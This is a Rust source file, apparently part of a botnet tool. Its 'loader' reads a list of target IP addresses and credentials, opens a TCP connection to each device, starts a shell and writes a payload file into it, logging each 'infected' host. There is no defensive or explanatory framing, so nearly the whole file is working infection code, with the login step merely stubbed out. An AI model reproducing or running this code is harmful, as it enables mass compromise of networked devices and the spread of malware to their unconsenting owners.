use std::path::PathBuf;
use std::error::Error;
use tokio::fs::File;
use tokio::io::{AsyncBufReadExt, BufReader};
use colored::*;

pub async fn run_load(input_file: PathBuf, payload_file: PathBuf) -> Result<(), Box<dyn Error>> {
    println!("* Starting Loader...");
    println!("* Loading Bots from: {:?}", input_file);
    println!("* Payload: {:?}", payload_file);
    
    let payload_content = tokio::fs::read_to_string(payload_file).await?;
    
    let file = File::open(input_file).await?;
    let reader = BufReader::new(file);
    let mut lines = reader.lines();

    while let Some(line) = lines.next_line().await? {
        if line.trim().is_empty() { continue; }
        // Format: ip:port user:pass
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() < 2 { continue; }
        
        let target = parts[0]; // ip:port
        let creds: Vec<&str> = parts[1].split(':').collect();
        if creds.len() < 2 { continue; }
        
        let user = creds[0];
        let pass = creds[1];
        
        println!("* Infecting {}...", target);
        
        // Connect and Infect
        if let Err(e) = infect_target(target, user, pass, &payload_content).await {
             eprintln!("{} Failed to infect {}: {}", "- Error:".red(), target, e);
        } else {
             println!("{} Infected {}", "+ SUCCESS:".green(), target);
        }
    }

    Ok(())
}

use std::time::Duration;
use tokio::net::TcpStream;
use tokio::io::AsyncWriteExt;

pub async fn infect_target(addr: &str, _user: &str, _pass: &str, payload: &str) -> Result<(), Box<dyn Error>> {
    let mut stream = TcpStream::connect(addr).await?;
    
    // Login flow skipped for demo (assuming open/authed state or handled by payload)
    
    // Initialize shell
    stream.write_all(b"sh\r\n").await?;
    
    // Wait for shell prompt
    tokio::time::sleep(Duration::from_millis(500)).await;
    
    // Send Payload
    stream.write_all(format!("{}\r\n", payload).as_bytes()).await?;
    
    Ok(())
}
